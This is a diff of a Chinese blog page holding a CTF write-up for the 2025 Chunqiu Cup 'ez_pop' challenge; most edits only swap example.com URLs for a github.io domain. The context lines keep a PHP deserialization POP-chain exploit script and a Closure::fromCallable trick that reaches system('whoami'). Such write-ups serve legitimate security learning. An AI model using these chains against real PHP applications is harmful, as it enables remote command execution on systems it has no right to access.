@@ -30,13 +30,13 @@
     <meta name="description" content="[TOC] 这个比赛忘记打了 就赛后复现一下吧  ez_pop 开题： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2025春秋杯夏季个人赛">
-<meta property="og:url" content="http://example.com/2025/07/18/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/index.html">
+<meta property="og:url" content="https://fub0y2026.github.io/2025/07/18/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/index.html">
 <meta property="og:site_name" content="KL">
 <meta property="og:description" content="[TOC] 这个比赛忘记打了 就赛后复现一下吧  ez_pop 开题： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2025/07/18/images/20250718233130641.png">
-<meta property="og:image" content="http://example.com/2025/07/18/images/0250718233708250.png">
-<meta property="og:image" content="http://example.com/2025/07/18/images/20250719000530423.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/20250718233130641.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/0250718233708250.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/20250719000530423.png">
 <meta property="article:published_time" content="2025-07-18T11:22:34.000Z">
 <meta property="article:modified_time" content="2026-04-18T08:18:53.290Z">
 <meta property="article:author" content="FuB0Y">
@@ -45,7 +45,7 @@
 <meta property="article:tag" content="Ruby模板注入">
 <meta property="article:tag" content="sanic内存马">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2025/07/18/images/20250718233130641.png">
+<meta name="twitter:image" content="https://fub0y2026.github.io/images/20250718233130641.png">
   
   
     <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
@@ -328,10 +328,10 @@
 <p><code>$a</code>必须要是<strong>内置类或者内置类里面的静态方法</strong>，<code>$b</code>是删除了<code>$a</code>的<strong>POST数组</strong>，<code>$c</code> 和 <code>$d</code> 可以任意控制</p>
 <p>经过参考题解发现，<code>Closure</code>里面的<code>fromCallable</code>可以调用函数执行命令：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Closure</span>::<span class="title function_ invoke__">fromCallable</span>(<span class="string">&quot;system&quot;</span>)(<span class="string">&quot;whoami&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p><img src="../images/20250718233130641.png" alt="image-20250718233130641" /></p>
+<p><img src="/images/20250718233130641.png" alt="image-20250718233130641" /></p>
 <p>那这里我们就能这样调用：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(&quot;Closure::fromCallablec&quot;,&quot;system&quot;)(&quot;whoami&quot;)();</span><br></pre></td></tr></table></figure>
-<p><img src="../images/0250718233708250.png" alt="image-20250718233708250" /></p>
+<p><img src="/images/0250718233708250.png" alt="image-20250718233708250" /></p>
 <p>这样虽然会报错，但还是会执行命令</p>
 <p>现在就考虑如何给各参数传值，主要就是$b,它是一个post数组</p>
 <p>这里就需要用到一个<strong>php</strong>的一个冷知识了：</p>
@@ -345,7 +345,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(&#x27;Closure::fromCallable&#x27;, &#x27;[&quot;Closure&quot;,&quot;fromCallable&quot;]&#x27;)(&#x27;system&#x27;)(&#x27;whoami&#x27;);</span><br><span class="line">-&gt;</span><br><span class="line">call_user_func(&#x27;Closure::fromCallable&#x27;, &#x27;Closure::fromCallable&#x27;)(&#x27;system&#x27;)(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
 <p>Test:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$b=$_POST;</span></span><br><span class="line"><span class="variable">$b</span>[<span class="number">0</span>]=<span class="string">&#x27;Closure&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>[<span class="number">1</span>]=<span class="string">&#x27;fromCallable&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;Closure::fromCallable&#x27;</span>, <span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br></pre></td></tr></table></figure>
-<p><img src="../images/20250719000530423.png" alt="image-20250719000530423" /></p>
+<p><img src="/images/20250719000530423.png" alt="image-20250719000530423" /></p>
 <p>注意：POST里面的参数除了那个a就只能是0和1，如果是其他的字符或数字都会报错，因为只有[0,1]才能构成一个<strong>可调用结构（callable）</strong></p>
 <h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h3>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class_A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class_B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>=<span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class_C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Class</span>_A();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Class</span>_B();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Class</span>_C();</span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">new</span> <span class="title function_ invoke__">class_C</span>();</span><br><span class="line"><span class="variable">$x</span>-&gt;c=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;c-&gt;a=<span class="string">&quot;any&quot;</span>;</span><br><span class="line"><span class="variable">$x</span>-&gt;c-&gt;s=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$pop</span> = <span class="keyword">array</span>(<span class="variable">$x</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i%3A1%3Bi%3A0%3B%7D&quot;</span>, <span class="string">&quot;i%3A1%3Bi%3A0%3B&quot;</span>, <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>)));</span><br><span class="line"><span class="comment">//a:2:&#123;i:0;O:7:&quot;class_C&quot;:1:&#123;s:1:&quot;c&quot;;O:7:&quot;class_A&quot;:2:&#123;s:1:&quot;s&quot;;O:7:&quot;class_B&quot;:2:&#123;s:1:&quot;c&quot;;s:6:&quot;system&quot;;s:1:&quot;d&quot;;s:6:&quot;whoami&quot;;&#125;s:1:&quot;a&quot;;s:3:&quot;any&quot;;&#125;&#125;i:1;i:0;&#125;</span></span><br></pre></td></tr></table></figure>
@@ -452,7 +452,7 @@
       
         
         
-          <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="[网鼎杯 2020 青龙组]filejava" class="lazyload">
+          <img data-src="/images/175637316152817563731618.jpg" data-sizes="auto" alt="[网鼎杯 2020 青龙组]filejava" class="lazyload">
         
       
       <a href="/2025/07/17/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dfilejava/"></a>
@@ -677,7 +677,7 @@
         window.REIMU_POST = {
           author: "FuB0Y",
           title: "2025春秋杯夏季个人赛",
-          url: "http://example.com/2025/07/18/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/",
+          url: "https://fub0y2026.github.io/2025/07/18/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/",
           excerpt: "",
           description: "",
           stripContent: "[TOC] 这个比赛忘记打了 就赛后复现一下吧  ez_pop 开题： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&amp;lt;?phperror",
